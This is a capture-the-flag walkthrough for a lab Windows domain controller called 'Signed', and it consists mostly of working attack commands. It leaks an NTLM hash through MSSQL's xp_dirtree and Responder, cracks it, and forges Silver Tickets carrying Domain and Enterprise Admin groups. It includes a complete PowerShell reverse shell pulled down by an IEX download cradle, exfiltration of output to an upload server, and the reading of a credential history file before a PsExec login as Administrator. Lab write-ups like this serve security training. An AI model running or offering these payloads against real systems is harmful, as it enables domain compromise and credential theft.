## Statement
As is common in real-life Windows penetration tests, the Signed box starts with credentials for an account that can access MSSQL: `scott / Sm230#C5NatH`.

## Reconnaissance
Using `nmap` to scan for open TCP ports and services on the target machine:

```bash
sudo nmap -sS -sV -A 10.10.11.90
```
We find only one open port: `1433`, used by MSSQL.

## First privilege escalation

We can use the provided credentials to connect to MSSQL with `impacket-mssqlclient`:

```bash
impacket-mssqlclient scott:'Sm230#C5NatH'@10.10.11.90
```

Access is restricted; we can only read limited data from the database.

The key issue is that `xp_dirtree` can be abused to trigger SMB authentication.

This can leak NTLM hashes for user `mssqlsvc` by forcing the server to connect to our SMB listener with [Responder](https://github.com/lgandx/Responder).

On our machine we start Responder:

```bash
sudo responder -I tun0 -wrf
```

Then run this in `mssqlclient`:
```sql
xp_dirtree '\\10.10.14.27\share'
```

> `10.10.14.27` is our attacking machine IP address.

Responder captures the NTLM hash for `mssqlsvc`.

Now that we have the NTLM hash for `mssqlsvc`, we crack it with `hashcat`:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

After recovering the password, we reconnect to MSSQL:

```bash
impacket-mssqlclient -windows-auth SIGNED/mssqlsvc:'purPLE9795!@'@10.10.11.90
```

> We need to use `-windows-auth` because mssqlsvc is a domain user.

## Second privilege escalation - Silver Ticket attack

Now that we have `mssqlsvc` credentials, we can forge a Silver Ticket and add privileged group membership to this user before reconnecting.

```bash
ticketer.py \         
  -nthash ef699384c3285c54128a3ee1ddb1a0cc \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain signed.htb \
  -spn MSSQLSvc/DC01.signed.htb \
  -user-id 1103 \
  -groups 512,1105 \
  mssqlsvc

export KRB5CCNAME="$(pwd)/mssqlsvc.ccache"
mssqlclient.py -k -windows-auth dc01.signed.htb -debug
```
> If you have an issue like `[-] ERROR(DC01): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.`, try to change the version to `Impacket v0.13.0`.

To enumerate RIDs, use:

```bash
nxc mssql 10.10.11.90 -u scott -p 'Sm230#C5NatH' --rid-brute --local-auth > rid
```

To generate the NT hash of `mssqlsvc`'s password, use:

```python
from passlib.hash import nthash
print(nthash.hash("purPLE9795!@"))
```

To retrieve the domain SID, query it from SQL:

```sql
select name, create_date, modify_date, type_desc as type, authentication_type_desc as authentication_type, sid from sys.database_principals
```

Take the domain SID value and convert it to standard SID format with this script:

```python
import binascii
import struct

hex_sid = "0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000"

# Convertir hex → bytes
sid_bytes = binascii.unhexlify(hex_sid)

# Décodage du SID
revision = sid_bytes[0]
subauth_count = sid_bytes[1]
authority = struct.unpack(">Q", b"\x00\x00" + sid_bytes[2:8])[0]

subauth = []
offset = 8
for i in range(subauth_count):
    sub = struct.unpack("<I", sid_bytes[offset:offset+4])[0]
    subauth.append(sub)
    offset += 4

# Construction du SID textuel
sid_str = f"S-{revision}-{authority}"
for sa in subauth:
    sid_str += f"-{sa}"

print(sid_str)
```


This allows us to read files directly from the system:

```sql
enable_xp_cmdshell
xp_cmdshell "type C:\Users\mssqlsvc\Desktop\user.txt"
```

This gives us the user flag.

## Root privilege escalation

At this stage, there are multiple ways to escalate to root.

We can use `xp_cmdshell` to get a reverse shell as `mssqlsvc`, then run `winPEAS` to identify escalation paths.

For this method, create a file named `rev.ps1` with the following content:

```powershell
$LHOST = "10.10.14.27"; $LPORT = 6667; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

Then start a netcat listener on your machine:

```bash
nc -lvnp 6667
```

And finally run the following command inside the mssqlclient to get a reverse shell:

```sql
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.27:8000/rev.ps1")| powershell -noprofile'
```

Now that we have a reverse shell as `mssqlsvc`, we can host `winPEAS` with a simple Python HTTP server:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
python3 -m http.server 8000
```

And inside the reverse shell we download it with `iwr`:

```powershell
iwr -Uri "http://10.10.14.27:8000/winPEASany_ofs.exe" -UseBasicParsing -OutFile C:\Users\mssqlsvc\Desktop\winPEASany_ofs.exe
```

And now we can run it:

```powershell
C:\Users\mssqlsvc\Desktop\winPEASany_ofs.exe > output.txt
```
> The output is hard to read in the reverse shell, so we send it to our Python HTTP server and download it locally. You can modify the server with this code:

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

class UploadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        filename = "/tmp/received_data.txt"
        with open(filename, "wb") as f:
            f.write(post_data)
        
        print(f"[+] Reçu {len(post_data)} bytes dans {filename}")
        print(f"[+] Contenu:\n{post_data.decode('utf-8', errors='ignore')}")

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK - File received")

server = HTTPServer(('0.0.0.0', 8000), UploadHandler)
print("[*] Server listening on http://0.0.0.0:8000")
server.serve_forever()
```

Then on the target machine we can send the output file to our server with this command:

```powershell
Invoke-WebRequest -Uri http://10.10.14.27:8000/upload -Method POST -InFile C:\Users\mssqlsvc\Desktop\output.txt -UseBasicParsing
```

> In this case, `winPEAS` does not reveal anything directly useful.

At this point, I was stuck for a while. Then I added group `519` (`Enterprise Admins`) to the Silver Ticket with this command:

```bash
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc \
  -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
  -domain signed.htb \
  -spn MSSQLSvc/DC01.signed.htb \
  -user-id 1103 \
  -groups 512,519,1105 \
  mssqlsvc     

export KRB5CCNAME="$(pwd)/mssqlsvc.ccache"     
mssqlclient.py -k -windows-auth dc01.signed.htb -debug
```

With this new ticket, we can read the Administrator flag:

```sql
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents
```

We got the root flag!

There are other escalation paths as well. For example, the Administrator password can be found in `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
with the following command:

```sql
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt', SINGLE_CLOB) AS Contents
```

We cannot read it directly with `xp_cmdshell` because commands run as `NT AUTHORITY\mssqlsvc`, which does not have access to that file.

With our Silver Ticket that includes `Enterprise Admins`, we can read it.

From the reverse shell, we can start a PowerShell session with Administrator credentials:

```powershell
iwr -Uri "http://10.10.14.27:8000/PsExec64.exe" -UseBasicParsing -OutFile C:\Users\mssqlsvc\Desktop\PsExec64.exe
.\PsExec64.exe -u SIGNED\Administrator -p "Th1s889Rabb!t" -s cmd /c type C:\Users\Administrator\Desktop\root.txt
```

We got the root flag again!
